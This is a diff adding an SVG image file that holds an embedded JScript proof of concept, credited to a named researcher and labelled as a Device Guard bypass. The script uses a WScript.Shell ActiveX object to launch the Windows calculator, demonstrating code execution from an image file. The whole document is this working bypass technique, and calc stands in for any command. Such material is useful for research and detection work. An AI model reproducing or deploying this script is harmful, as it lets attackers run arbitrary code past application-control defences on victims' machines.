@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+xmlns:xlink="http://www.w3.org/1999/xlink" width="600" height="600">
+
+	<script language="JScript">
+
+		<![CDATA[
+		
+		<!-- Author Matt harr0ey @harr0ey
+		<!-- Topic: Device Guard Bypassing
+		<!-- WScript inside SVG
+
+			var r = new ActiveXObject("WScript.Shell").Run("calc")
+    ]]>
+  </script>
+  <rect id="square" width="0" height="0" fill="#ff0000"
+   x="10" y="10" />
+</svg>
